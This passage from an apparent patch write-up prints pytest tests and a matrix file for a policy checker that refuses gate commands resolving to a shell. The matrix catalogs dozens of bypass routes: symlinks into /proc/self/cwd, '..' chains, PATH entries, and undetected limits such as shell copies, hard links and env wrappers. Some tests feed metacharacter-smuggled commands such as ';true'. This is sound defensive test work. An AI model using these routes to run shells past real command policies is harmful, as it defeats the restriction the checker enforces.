def test_the_handlers_are_left_alone_off_the_main_thread() -> None:
    import threading

    def sentinel(signum: int, frame: Any) -> None:
        pass

    box: list[Any] = []

    def work() -> None:
        with gm._signals_raise():
            box.append([signal.getsignal(s) for s in gm.HANDLED_SIGNALS])

    before = {s: signal.signal(s, sentinel) for s in gm.HANDLED_SIGNALS}
    try:
        t = threading.Thread(target=work)
        t.start()
        t.join(10)
        assert box == [[sentinel, sentinel]]
        assert all(signal.getsignal(s) is sentinel for s in gm.HANDLED_SIGNALS)
    finally:
        for s, h in before.items():
            signal.signal(s, h)


def test_a_handler_installed_from_c_is_restored_to_the_default(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    calls: list[tuple[Any, Any]] = []

    def fake(sig: Any, handler: Any) -> Any:
        calls.append((sig, handler))
        return None  # what signal.signal returns for a handler installed from C

    monkeypatch.setattr(gm.signal, "signal", fake)
    with gm._signals_raise():
        pass
    assert [c[1] for c in calls[:2]] == [gm._raise_exit, gm._raise_exit]
    assert calls[2:] == [(s, signal.SIG_DFL) for s in gm.HANDLED_SIGNALS]


# --- the resolution-mismatch matrix, real CLI (round 3c): tests/gate_matrix.py -----------------


def _matrix(only: str) -> list[Any]:
    rows = gate_matrix.ROWS
    if only == "refused":
        return [r for r in rows if "limit" not in r[5]]
    if only == "core":
        return [r for r in rows if "limit" not in r[5] and r[5].get("core")]
    return [r for r in rows if "limit" in r[5]]


@pytest.mark.parametrize("row", _matrix("refused"), ids=lambda r: r[0])
def test_matrix_every_row_is_refused_with_the_runner_in_another_folder(row: Any) -> None:
    """M1: runner cwd B/a/b, --root B. Exit 2, policy-error, nothing spawned, no MARK."""
    verdict, note = gate_matrix.run_row(row, "M1", SRC, PY)
    assert verdict == "refused", (row[1], note)


@pytest.mark.parametrize("mode", ["M2", "M3"])
@pytest.mark.parametrize("row", _matrix("core"), ids=lambda r: r[0])
def test_matrix_core_rows_are_refused_in_every_runner_placement(row: Any, mode: str) -> None:
    """M2: runner cwd = the gate's cwd. M3: --root elsewhere (B/sub), default gate cwd."""
    verdict, note = gate_matrix.run_row(row, mode, SRC, PY)
    assert verdict in ("refused", "n/a"), (row[1], note)


@pytest.mark.parametrize("row", _matrix("limit"), ids=lambda r: r[0])
def test_matrix_documented_limits_really_run_the_marker(row: Any) -> None:
    """Pinned so the documentation cannot go stale: these are NOT detected, and the child runs it."""
    verdict, note = gate_matrix.run_row(row, "M1", SRC, PY)
    assert verdict == "MARK", (row[1], note)


def test_the_d1_repro_exactly_as_qa_reported_it(tmp_path: Path) -> None:
    """A `..` after a link to /proc/self/cwd: gate folder `sub` holds lnk -> /proc/self/cwd, its parent
    holds mysh -> a shell; runner in D/a/b, --root D. Before the fix the child ran the shell."""
    (tmp_path / "sub").mkdir()
    (tmp_path / "a" / "b").mkdir(parents=True)
    fake = tmp_path / "bin" / "bash"
    fake.parent.mkdir()
    fake.write_text(gate_matrix.FAKE)
    fake.chmod(0o755)
    (tmp_path / "sub" / "lnk").symlink_to("/proc/self/cwd")
    (tmp_path / "mysh").symlink_to("bin/bash")
    gf = write(
        tmp_path, doc({"id": "a", "argv": ["lnk/../mysh", "-c", "touch MARK"], "cwd": "sub"})
    )
    proc = cli(str(gf), "--root", str(tmp_path), cwd=tmp_path / "a" / "b")
    assert proc.returncode == 2 and json.loads(proc.stdout)["gates"][0]["status"] == "policy-error"
    assert "'..'" in json.loads(proc.stdout)["gates"][0]["message"]
    assert not list(tmp_path.rglob("MARK"))


@pytest.mark.parametrize(
    "word", ["../x", "a/../b", "./a/..", "..", "x/..", "/usr/../bin/tool", "d/../d"]
)
def test_any_dotdot_component_in_the_executable_is_refused_before_any_normalisation(
    tmp_path: Path, word: str
) -> None:
    """The cost of the root-cause rule: even a harmless `..` is refused (use the path without it)."""
    got = plan(tmp_path, argv=(word, "-c", "x"))
    assert isinstance(got, str) and "'..'" in got and word not in got.replace("'..'", "")


def test_dotdot_is_refused_in_a_path_entry_that_the_search_reaches_not_in_one_after_the_hit(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "d1").mkdir()
    tool = tmp_path / "d1" / "mytool"
    tool.write_text("#!/bin/sh\nexit 0\n")
    tool.chmod(0o755)
    monkeypatch.setenv("PATH", f"{tmp_path / 'd1'}:{tmp_path}/x/..")  # the hit is found first: fine
    assert isinstance(plan(tmp_path, argv=("mytool",)), Plan)
    monkeypatch.setenv(
        "PATH", f"{tmp_path}/x/..:{tmp_path / 'd1'}"
    )  # reached before the hit: refused
    got = plan(tmp_path, argv=("mytool",))
    assert isinstance(got, str) and "'..'" in got


def test_arguments_and_python_bodies_and_declared_shell_gates_keep_their_dotdot(
    tmp_path: Path,
) -> None:
    assert isinstance(plan(tmp_path, argv=("python", "-c", "import os; os.listdir('..')")), Plan)
    assert isinstance(plan(tmp_path, argv=("cat", "../x", "a/../b")), Plan)
    got = plan(tmp_path, command="cat ../x | wc", shell=True, allow_shell=True)
    assert isinstance(got, Plan)


def test_an_unreadable_link_or_any_os_error_while_resolving_is_a_refusal_not_a_pass(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    (tmp_path / "mysh").symlink_to("bin/bash")

    def boom(path: Any) -> str:
        raise OSError(13, "denied")

    monkeypatch.setattr(gm.os, "readlink", boom)
    got = plan(tmp_path, argv=("./mysh", "-c", "x"))
    assert isinstance(got, str) and "could not be examined" in got


def test_the_root_names_are_matched_whole_so_a_sibling_folder_is_not_inside_them(
    tmp_path: Path,
) -> None:
    """Pinned behaviour (QA Q25): /developer/x and /procfs/x are NOT under /dev or /proc."""
    for word in ["/developer/tool", "/devices/x", "/procfs/x", "/process/x", "/devx"]:
        got = plan(tmp_path, argv=(word,))
        assert not (isinstance(got, str) and "/proc or /dev" in got), word
    for word in [
        "/dev",
        "/proc",
        "/dev/null",
        "//dev/null",
        "//proc/self/cwd/x",
        "/dev//null",
        "/./dev/null",
    ]:
        got = plan(tmp_path, argv=(word,))
        assert isinstance(got, str) and "/proc or /dev" in got, word


@pytest.mark.parametrize("ch", list(";&|`$<>"), ids=lambda c: repr(c))
def test_a_metacharacter_as_the_first_character_is_refused_too(tmp_path: Path, ch: str) -> None:
    """QA Q42: the scan must cover index 0 (`;true`, `$HOME/x`, `|x`). A leading newline or carriage
    return is stripped with the other outer whitespace, so it is not a first character."""
    got = plan(tmp_path, command=f"{ch}true")
    assert isinstance(got, str) and "metacharacters" in got


def test_a_relative_link_target_is_resolved_from_the_links_own_folder(tmp_path: Path) -> None:
    """l -> proc/tool means <folder of l>/proc/tool, not /proc/tool: a harmless tool is accepted."""
    (tmp_path / "proc").mkdir()
    tool = tmp_path / "proc" / "tool"
    tool.write_text("#!/bin/sh\nexit 0\n")
    tool.chmod(0o755)
    (tmp_path / "l").symlink_to("proc/tool")
    assert isinstance(plan(tmp_path, argv=("./l",)), Plan)
    (tmp_path / "m").symlink_to(
        "proc/self/cwd"
    )  # no such folder here: nothing under /proc is entered
    assert isinstance(plan(tmp_path, argv=("./m/tool",)), Plan)


def test_a_dotdot_inside_a_link_target_is_applied_to_the_folder_reached_so_far(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The word has no `..`, but a link's target may: it is walked physically (the parent of the folder
    reached, links already resolved), so `lnk/../mysh` inside a target cannot hide a link to /proc.
    """
    run_dir, sub = tmp_path / "run", tmp_path / "sub"
    run_dir.mkdir()
    sub.mkdir()
    (sub / "lnk").symlink_to("/proc/self/cwd")
    (sub / "m2").symlink_to("lnk/../mysh")
    (sub / "m3").symlink_to("../" * 30 + "proc/self/cwd/mysh")
    (sub / "up").symlink_to("../" * 30)
    monkeypatch.chdir(run_dir)
    for word in ["./m2", "./m3", "up/proc/self/cwd/mysh", "up/dev/null"]:
        got = plan_gate(G(argv=(word, "-c", "x"), cwd="sub"), Workspace(tmp_path), False)
        assert isinstance(got, str) and "/proc or /dev" in got, word


def test_a_harmless_dotdot_inside_a_link_target_is_followed_not_refused(tmp_path: Path) -> None:
    """The `..` rule is for the executable WORD; a link's own target may use `..` and is resolved."""
    (tmp_path / "x").mkdir()
    (tmp_path / "y").mkdir()
    tool = tmp_path / "y" / "tool"
    tool.write_text("#!/bin/sh\nexit 0\n")
    tool.chmod(0o755)
    (tmp_path / "l").symlink_to("../" + tmp_path.name + "/x/../y/tool")
    assert isinstance(plan(tmp_path, argv=("./l",)), Plan)
    assert gm._walk(str(tmp_path / "l")) == str(tool)
    assert gm._walk("/") == "/" and gm._walk("/a/b/c") == "/a/b/c"


def test_a_path_hit_that_is_a_link_into_proc_is_refused_when_the_runner_lacks_the_target(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The runner's /proc/self/cwd has no `mysh`, so `isfile` there says no and the search would go on,
    while the child opens ITS cwd and finds the shell: the hit is walked before it is tested."""
    run_dir, sub = tmp_path / "run", tmp_path / "sub"
    run_dir.mkdir()
    sub.mkdir()
    (sub / "mytool").symlink_to("/proc/self/cwd/mysh")
    monkeypatch.chdir(run_dir)
    monkeypatch.setenv("PATH", str(sub))
    got = plan_gate(G(argv=("mytool", "-c", "a"), cwd="sub"), Workspace(tmp_path), False)
    assert isinstance(got, str) and "/proc or /dev" in got


_FUZZ_NAMES = ["l1", "l2", "l3", "mysh", "d", "e"]
_FUZZ_TOK = _FUZZ_NAMES + ["lnk", "up", "mysh2", "z", "m3", "q", "..", "..", ".", "sub", "bin"]
_FUZZ_TOK += ["bash", "x", "y", "", "proc", "self", "cwd", "root", "dev", "fd"]


def _fuzz_layout(rnd: random.Random, base: Path) -> None:
    def toks(k: int) -> str:
        return "/".join(rnd.choice(_FUZZ_TOK) for _ in range(k))

    links = [
        ("sub/lnk", rnd.choice(["/proc/self/cwd", "/proc/thread-self/cwd", f"/proc/self/root{base}/sub",
                                "../" * 12 + "proc/self/cwd", ".", "/proc/self/cwd/.", "/proc/self/cwd/../sub"])),
        ("sub/up", rnd.choice(["..", "../", "../.", "../sub/..", "../x/.."])),
        ("sub/d", rnd.choice(["../bin", f"{base}/bin", "../x/../bin", "up/bin"])),
        ("mysh", rnd.choice(["bin/bash", "./bin/bash", f"{base}/bin/bash"])),
        ("sub/mysh2", rnd.choice(["../bin/bash", "d/bash", "../mysh", "lnk/../mysh"])),
        ("x/y/z", rnd.choice(["../../bin", "../../mysh", "../../sub/lnk", "../../sub/up"])),
        ("bin/m3", rnd.choice(["bash", "./bash", "../mysh", "../sub/mysh2"])),
        ("x/q", rnd.choice(["y/z", "y/z/bash", "../mysh"])),
    ]  # fmt: skip
    for rel, target in links:
        if rnd.random() < 0.8:
            (base / rel).symlink_to(target)
    for _ in range(rnd.randint(0, 2)):  # random extra links, some into /proc and /dev
        where = base / rnd.choice(["", "sub", "bin", "x", "x/y"]) / rnd.choice(_FUZZ_NAMES)
        if not where.is_symlink() and not where.exists():
            kind = rnd.random()
            if kind < 0.3:
                target = rnd.choice(
                    ["/proc/self/cwd", "/proc/self/root", "/dev", "/dev/fd", "/proc"]
                )
                target += "/" + toks(rnd.randint(0, 3))
            elif kind < 0.6:
                target = "../" * rnd.randint(1, 14) + toks(rnd.randint(0, 3))
            else:
                target = toks(rnd.randint(1, 4))
            where.symlink_to(target or "bin/bash")


@pytest.mark.parametrize("seed", [1, 2, 3])
def test_differential_fuzz_the_kernel_resolution_versus_the_plan(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, seed: int
) -> None:
    """Truth: this process with its cwd set to the gate's cwd stats the word (what the child's exec
    resolves; /proc/self/cwd is then the gate's folder). Plan: `_shell_refusal` with the process cwd in
    another folder (the runner). If the kernel reaches the test-made `bash`, the plan must refuse.
    Random links (to /proc, /dev, `..` chains, absolute and relative) and random words."""
    rnd = random.Random(seed)
    reached = 0
    wrong: list[Any] = []
    for n in range(150):
        base = (tmp_path / f"L{n}").resolve()
        for d in ["bin", "sub", "a/b", "x/y"]:
            (base / d).mkdir(parents=True)
        bash = base / "bin" / "bash"
        bash.write_text(gate_matrix.FAKE)
        bash.chmod(0o755)
        want = (bash.stat().st_dev, bash.stat().st_ino)
        _fuzz_layout(rnd, base)
        for _ in range(40):
            if rnd.random() < 0.25:
                word = rnd.choice([*_FUZZ_NAMES, "bash", "mysh2", "m3", "lnk"])
                entries = ["", ".", "sub", "bin", "x", f"{base}/sub", f"{base}/x/y", f"{base}/bin"]
                entries += ["/proc/self/cwd", "d", "e", "l1", "l2"]
                path: str | None = ":".join(rnd.choice(entries) for _ in range(rnd.randint(1, 3)))
            else:
                pre = rnd.choice(
                    ["", "./", f"{base}/", "/proc/self/cwd/", "sub/", "../", "/", "//", "bin/"]
                )
                tail = [rnd.choice([*_FUZZ_NAMES, "bash", "mysh", "mysh2", "m3", "z", "q"])]
                word = pre + "/".join(
                    [rnd.choice(_FUZZ_TOK) for _ in range(rnd.randint(0, 4))] + tail
                )
                path = None
            if not word or word.startswith("-") or "=" in word or word.endswith("/"):
                continue
            if "/" not in word and path is None:
                path = os.environ["PATH"]
            monkeypatch.chdir(base / "sub")
            hit = None
            if path is None:
                hit = word
            else:
                for entry in path.split(":"):
                    cand = os.path.join(entry, word)
                    if os.path.isfile(cand) and os.access(cand, os.X_OK):
                        hit = cand
                        break
            try:
                st = os.stat(hit) if hit is not None else None
            except OSError:
                st = None
            monkeypatch.chdir(base / "a" / "b")
            if path is not None:
                monkeypatch.setenv("PATH", path)
            got = gm._shell_refusal((word,), base / "sub")
            monkeypatch.undo()
            if st is not None and (st.st_dev, st.st_ino) == want:
                reached += 1
                if got is None:
                    wrong.append((word, path))
        shutil.rmtree(base)
    assert reached >= 40, reached  # the generator really builds routes to the shell
    assert not wrong, wrong[:3]
```

### D. `tests/gate_matrix.py` (new in rev 3c, 573 lines, in full; imported by `tests/test_gates.py` and by `02_strategy-architect_C9_probe_matrix.py`)

```python
"""The C9 resolution-mismatch matrix: every way the RUNNER and the CHILD could resolve the executable
word of a non-shell gate differently, as data plus a real-CLI runner. Used by tests/test_gates.py and by
the probe script (_workspace/02_strategy-architect_C9_probe_matrix.py), so the table exists once.

A row builds a fresh folder B holding a test-made "shell" (an executable file called bash that creates
MARK in its cwd with a shell builtin), the row's links and one gate, then runs the REAL CLI in a mode:
M1 runner cwd B/a/b (not the gate's), --root B; M2 runner cwd = the gate's cwd; M3 runner cwd B/a/b,
--root B/sub, default gate cwd. A refused row must give exit 2, status policy-error and no MARK.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
from pathlib import Path

STRACE = shutil.which("strace") or "strace"  # absolute: a row may set a PATH without it
FAKE = '#!/bin/sh\n: > "$PWD/MARK"\n'  # a builtin only: PATH may not hold touch
# (id, description, files, gate, PATH, extra); files: (relpath, kind, arg), kinds fake | link | file | copy |
# hard | dir; gate: ("argv", [words]) | ("command", text); {B} base, {S} B/sub, {Brel} B without the slash;
# extra: cwd, rootarg, skip3, limit (a documented limit: MARK is expected), core (also run in M2 and M3)
D1 = [("sub/lnk", "link", "/proc/self/cwd"), ("mysh", "link", "bin/bash")]
M = "mysh"
ROWS: list[tuple] = [
    (
        "r01",
        "file named like a shell",
        [("sub/bash", "fake", "")],
        ("argv", ["./bash", "-c", "x"]),
        None,
        {},
    ),
    (
        "r02",
        "link last, relative target",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["./mysh", "-c", "x"]),
        None,
        {"core": True},
    ),
    (
        "r03",
        "link last, absolute target",
        [("sub/mysh", "link", "{B}/bin/bash")],
        ("argv", ["./mysh", "-c", "x"]),
        None,
        {},
    ),
    (
        "r04",
        "chain mixing absolute and relative targets",
        [("sub/l1", "link", "l2"), ("sub/l2", "link", "{S}/l3"), ("sub/l3", "link", "../bin/bash")],
        ("argv", ["./l1"]),
        None,
        {"core": True},
    ),
    (
        "r05",
        "dir link in the middle",
        [("sub/d", "link", "../bin"), ("bin/mysh", "link", "bash")],
        ("argv", ["d/mysh"]),
        None,
        {"core": True},
    ),
    (
        "r06",
        "dir link first, absolute word",
        [("sub/d", "link", "../bin"), ("bin/mysh", "link", "bash")],
        ("argv", ["{S}/d/mysh"]),
        None,
        {},
    ),
    (
        "r07",
        "target climbing to the root",
        [("sub/mysh", "link", "../" * 12 + "{Brel}/bin/bash")],
        ("argv", ["./mysh"]),
        None,
        {},
    ),
    (
        "r08",
        "D1: .. after a link to /proc/self/cwd",
        D1,
        ("argv", ["lnk/../mysh", "-c", "x"]),
        None,
        {"skip3": True, "core": True},
    ),
    (
        "r09",
        "D1 absolute word",
        D1,
        ("argv", ["{S}/lnk/../mysh", "-c", "x"]),
        None,
        {"skip3": True, "core": True},
    ),
    (
        "r10",
        "D1 with ./",
        D1,
        ("argv", ["./lnk/../mysh", "-c", "x"]),
        None,
        {"skip3": True, "core": True},
    ),
    (
        "r11",
        "D1 link to /proc/thread-self/cwd",
        [("sub/lnk", "link", "/proc/thread-self/cwd"), ("mysh", "link", "bin/bash")],
        ("argv", ["lnk/../mysh"]),
        None,
        {"skip3": True, "core": True},
    ),
    (
        "r12",
        "D1 as a PATH entry lnk/..",
        D1,
        ("argv", ["mysh", "-c", "x"]),
        "lnk/..:{B}/none",
        {"skip3": True, "core": True},
    ),
    (
        "r13",
        "D1 string form",
        D1,
        ("command", "lnk/../mysh -c x"),
        None,
        {"skip3": True, "core": True},
    ),
    (
        "r14",
        ".. after a plain directory link",
        [("sub/d", "link", "../bin"), ("mysh2", "link", "bin/bash")],
        ("argv", ["d/../mysh2"]),
        None,
        {"skip3": True, "core": True},
    ),
    (
        "r15",
        ".. with no link at all (cost: refused)",
        [("mysh", "link", "bin/bash")],
        ("argv", ["../mysh"]),
        None,
        {"skip3": True},
    ),
    (
        "r16",
        "/proc/self/cwd/<link>",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["/proc/self/cwd/mysh"]),
        None,
        {"core": True},
    ),
    (
        "r17",
        "/proc/thread-self/cwd/<link>",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["/proc/thread-self/cwd/mysh"]),
        None,
        {},
    ),
    (
        "r18",
        "/proc/self/cwd/./<link>",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["/proc/self/cwd/./mysh"]),
        None,
        {},
    ),
    (
        "r19",
        "/proc//self/cwd//<link>",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["/proc//self/cwd//mysh"]),
        None,
        {},
    ),
    (
        "r20",
        "//proc/self/cwd/<link>",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["//proc/self/cwd/mysh"]),
        None,
        {},
    ),
    (
        "r21",
        "/./proc/self/cwd/<link>",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["/./proc/self/cwd/mysh"]),
        None,
        {},
    ),
    (
        "r22",
        "/proc/self/root/<B>/sub/<link>",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["/proc/self/root{S}/mysh"]),
        None,
        {},
    ),
    ("r23", "/proc/self/exe", [], ("argv", ["/proc/self/exe"]), None, {}),
    ("r24", "/proc/self/fd/0", [], ("argv", ["/proc/self/fd/0"]), None, {}),
    ("r25", "/dev/fd/0", [], ("argv", ["/dev/fd/0"]), None, {}),
    ("r26", "/dev/stdin", [], ("argv", ["/dev/stdin"]), None, {}),
    ("r27", "/dev/null", [], ("argv", ["/dev/null"]), None, {}),
    ("r28", "/dev/shm/x (cost: refused)", [], ("argv", ["/dev/shm/x"]), None, {}),
    ("r29", "/proc/1/root/bin/sh", [], ("argv", ["/proc/1/root/bin/sh"]), None, {}),
    ("r30", "/dev//fd/0 and /dev/./fd/0", [], ("argv", ["/dev/./fd/0"]), None, {}),
    (
        "r31",
        "link to /proc/self/cwd/<link>",
        [("sub/lnk", "link", "/proc/self/cwd/mysh"), ("sub/mysh", "link", "../bin/bash")],
        ("argv", ["./lnk"]),
        None,
        {"core": True},
    ),
    (
        "r32",
        "dir link to /proc/self/cwd",
        [("sub/pdir", "link", "/proc/self/cwd"), ("sub/mysh", "link", "../bin/bash")],
        ("argv", ["pdir/mysh"]),
        None,
        {},
    ),
    (
        "r33",
        "dir link to /dev then fd/0",
        [("sub/dd", "link", "/dev")],
        ("argv", ["dd/fd/0"]),
        None,
        {},
    ),
    (
        "r34",
        "chain ending in /dev/stdin",
        [("sub/l1", "link", "l2"), ("sub/l2", "link", "/dev/stdin")],
        ("argv", ["./l1"]),
        None,
        {},
    ),
    (
        "r35",
        "link to /proc/self/exe",
        [("sub/l1", "link", "/proc/self/exe")],
        ("argv", ["./l1"]),
        None,
        {},
    ),
    (
        "r36",
        "link target climbs with .. to the root, then /proc/self/cwd/<link>",
        [
            ("sub/lnk", "link", "../" * 30 + "proc/self/cwd/mysh"),
            ("sub/mysh", "link", "../bin/bash"),
        ],
        ("argv", ["./lnk"]),
        None,
        {"core": True},
    ),
    (
        "r37",
        "dir link up to / (all ..), then proc/self/cwd/<link>",
        [("sub/up", "link", "../" * 30), ("sub/mysh", "link", "../bin/bash")],
        ("argv", ["up/proc/self/cwd/mysh"]),
        None,
        {"core": True},
    ),
    (
        "r38",
        "D1 inside a link TARGET: lnk/../mysh with lnk -> /proc/self/cwd",
        [
            ("sub/lnk", "link", "/proc/self/cwd"),
            ("sub/m2", "link", "lnk/../mysh"),
            ("mysh", "link", "bin/bash"),
        ],
        ("argv", ["./m2"]),
        None,
        {"core": True},
    ),
    (
        "r39",
        "link target climbs with .. to /dev/fd",
        [("sub/dd", "link", "../" * 30 + "dev/fd")],
        ("argv", ["dd/0"]),
        None,
        {"core": True},
    ),
    (
        "r40",
        "relative PATH entry",
        [("sub/bin/mysh", "link", "{B}/bin/bash")],
        ("argv", ["mysh"]),
        "bin",
        {"core": True},
    ),
    (
        "r41",
        "empty PATH entry",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["mysh"]),
        ":{B}/none",
        {},
    ),
    ("r42", "PATH entry .", [("sub/mysh", "link", "../bin/bash")], ("argv", ["mysh"]), ".", {}),
    (
        "r43",
        "PATH entry /proc/self/cwd",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["mysh"]),
        "/proc/self/cwd",
        {"core": True},
    ),
    (
        "r44",
        "directory link in PATH",
        [("sub/pd", "link", "../bin"), ("bin/mysh", "link", "bash")],
        ("argv", ["mysh"]),
        "pd",
        {"core": True},
    ),
    (
        "r45",
        "PATH entry that is a link to /proc/self/cwd",
        [("sub/pc", "link", "/proc/self/cwd"), ("sub/mysh", "link", "../bin/bash")],
        ("argv", ["mysh"]),
        "pc",
        {},
    ),
    (
        "r46",
        "PATH entry with ..",
        [("bin/mysh", "link", "bash")],
        ("argv", ["mysh"]),
        "../bin",
        {"skip3": True},
    ),
    (
        "r47",
        "first PATH hit is the shell link",
        [("d1/mysh", "link", "{B}/bin/bash"), ("d2/mysh", "file", "#!/bin/sh\nexit 0\n")],
        ("argv", ["mysh"]),
        "{B}/d1:{B}/d2",
        {},
    ),
    (
        "r48",
        "PATH hit is a link into /proc/self/cwd (relative entry; the runner's cwd lacks the target)",
        [("sub/bin2/tool", "link", "/proc/self/cwd/mysh"), ("sub/mysh", "link", "../bin/bash")],
        ("argv", ["tool"]),
        "bin2",
        {"core": True},
    ),
    (
        "r49",
        "PATH hit is a link into /proc/self/cwd (absolute entry)",
        [("d1/tool", "link", "/proc/self/cwd/mysh"), ("sub/mysh", "link", "../bin/bash")],
        ("argv", ["tool"]),
        "{B}/d1",
        {"core": True},
    ),
    (
        "r50",
        ".//mysh and ./././mysh",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["./././mysh"]),
        None,
        {},
    ),
    (
        "r51",
        "trailing slash",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["./mysh/"]),
        None,
        {},
    ),
    ("r52", "case: MYSH", [("sub/MYSH", "link", "../bin/bash")], ("argv", ["./MYSH"]), None, {}),
    (
        "r53",
        "symlinked gate cwd",
        [("lnkdir", "link", "sub"), ("sub/mysh", "link", "../bin/bash")],
        ("argv", ["./mysh"]),
        None,
        {"cwd": "lnkdir", "skip3": True},
    ),
    (
        "r54",
        "symlinked --root",
        [("rootlink", "link", "."), ("sub/mysh", "link", "../bin/bash")],
        ("argv", ["./mysh"]),
        None,
        {"rootarg": "{B}/rootlink"},
    ),
    (
        "r55",
        "link in a subfolder of the gate cwd",
        [("sub/x/mysh", "link", "../../bin/bash")],
        ("argv", ["./x/mysh"]),
        None,
        {},
    ),
    ("r58", "//dev/null (QA Q26: the double-slash form)", [], ("argv", ["//dev/null"]), None, {}),
    (
        "r59",
        "//proc/1/cwd/x (another pid, double slash)",
        [],
        ("argv", ["//proc/1/cwd/x"]),
        None,
        {},
    ),
    (
        "r57",
        "links first, middle and last in one word (a1/a2/mysh)",
        [
            ("sub/a1", "link", "x"),
            ("sub/x/a2", "link", "../../bin"),
            ("bin/mysh", "link", "bash"),
        ],
        ("argv", ["a1/a2/mysh"]),
        None,
        {"core": True},
    ),
    (
        "r56",
        "LIMIT: env handed a link to a shell",
        [("sub/mysh", "link", "../bin/bash")],
        ("argv", ["env", "./mysh"]),
        None,
        {
            "limit": "the wrapper rule compares argument names, not what a link points at: not detected"
        },
    ),
    (
        "l01",
        "LIMIT: a copy of a shell",
        [("sub/tool", "copy", "")],
        ("argv", ["./tool"]),
        None,
        {"limit": "a copy has its own name and content: not detected"},
    ),
    (
        "l02",
        "LIMIT: a hard link of a shell",
        [("sub/tool", "hard", "")],
        ("argv", ["./tool"]),
        None,
        {"limit": "a hard link is a second name for the same inode: not detected"},
    ),
    (
        "l03",
        "LIMIT: a symlink to a wrapper",
        [("sub/w", "link", "/usr/bin/env"), ("bin/mysh", "link", "bash")],
        ("argv", ["./w", "{B}/bin/mysh"]),
        None,
        {"limit": "a link to a wrapper is not a wrapper name: not detected"},
    ),
    (
        "l04",
        "LIMIT: earlier PATH file exec skips (no shebang)",
        [("d1/mysh", "file", "plain data\n"), ("d2/mysh", "link", "{B}/bin/bash")],
        ("argv", ["mysh"]),
        "{B}/d1:{B}/d2",
        {"limit": "exec skips d1/mysh (ENOEXEC) and runs d2/mysh; the plan stops at d1"},
    ),
    (
        "l05",
        "LIMIT: a shell not in the 14 names",
        [("sub/ksh93", "fake", "")],
        ("argv", ["./ksh93"]),
        None,
        {"limit": "the list has 14 names; ksh93 is not one"},
    ),
]


def build(base: Path, files: list) -> Path:
    rel = str(base).lstrip("/")
    (base / "bin").mkdir()
    (base / "sub").mkdir()
    (base / "a" / "b").mkdir(parents=True)
    (base / "bin" / "bash").write_text(FAKE)
    (base / "bin" / "bash").chmod(0o755)

    def subst(text: str) -> str:
        return (
            text.replace("{B}", str(base)).replace("{S}", str(base / "sub")).replace("{Brel}", rel)
        )

    for relpath, kind, arg in files:
        p = base / relpath
        p.parent.mkdir(parents=True, exist_ok=True)
        if kind == "fake":
            p.write_text(FAKE)
            p.chmod(0o755)
        elif kind == "file":
            p.write_text(subst(arg))
            p.chmod(0o755)
        elif kind == "link":
            p.symlink_to(subst(arg))
        elif kind == "copy":
            shutil.copy(base / "bin" / "bash", p)
        elif kind == "hard":
            os.link(base / "bin" / "bash", p)
        elif kind == "dir":
            p.mkdir()
    return base


def run_row(
    row: tuple, mode: str, src: Path, py: str, scratch: Path | None = None, strace: bool = False
) -> tuple[str, str]:
    """Returns (verdict, note): n/a, MARK (the child ran the shell), refused, or other."""
    _rid, _desc, files, gate, path, extra = row
    if mode == "M3" and extra.get("skip3"):
        return "n/a", ""
    base = Path(tempfile.mkdtemp(prefix="gm_", dir=scratch)).resolve()
    try:
        build(base, files)

        def subst(text: str) -> str:
            return text.replace("{B}", str(base)).replace("{S}", str(base / "sub"))

        entry: dict = {"id": "g"}
        if gate[0] == "argv":
            entry["argv"] = [subst(w) for w in gate[1]]
        else:
            entry["command"] = subst(gate[1])
        entry["cwd"] = "." if mode == "M3" else extra.get("cwd", "sub")
        gf = base / "gates.json"
        gf.write_text(json.dumps({"schema_version": 1, "gates": [entry]}))
        root = str(base / "sub") if mode == "M3" else subst(extra.get("rootarg", str(base)))
        runner = base / "sub" if mode == "M2" else base / "a" / "b"
        env = {**os.environ, "PYTHONPATH": str(src)}
        if path is not None:
            env["PATH"] = subst(path)
        cmd = [py, "-B", "-m", "master_finhub.evals.gates", str(gf), "--root", root]
        if strace:
            cmd = [
                STRACE,
                "-f",
                "-qq",
                "-e",
                "trace=execve",
                "-o",
                str(base / "strace.log"),
            ] + cmd
        done = subprocess.run(
            cmd, cwd=runner, env=env, capture_output=True, text=True, timeout=120, check=False
        )
        try:
            status = json.loads(done.stdout)["gates"][0]["status"]
        except (ValueError, KeyError, IndexError):
            status = "?"
        note = f"exit={done.returncode} status={status}"
        if strace:
            lines = (base / "strace.log").read_text().splitlines()
            ran = [
                ln
                for ln in lines
                if "execve(" in ln
                and any(n in ln for n in ("bash", "mysh", "tool", "ksh93", '/w"', "lnk", "/m2"))
            ]
            note += f" gate-execs={len(ran)}"
        if list(base.rglob("MARK")):
            return "MARK", note
        if done.returncode == 2 and status == "policy-error":
            return "refused", note
        return "other", note + " " + done.stderr.strip()[-80:]
    finally:
        shutil.rmtree(base, ignore_errors=True)
```


## Proof

Every command below was run on scratch tar copies (never the repo): `final0/` = tracked files of origin/main 588dd9b without `references/` (CI does not fetch it either), `final/` = the same with the patch applied by `git apply`. The outputs are saved next to this file as `02_strategy-architect_C9_mutate.out` and `02_strategy-architect_C9_redos.out`; the rest is quoted here.

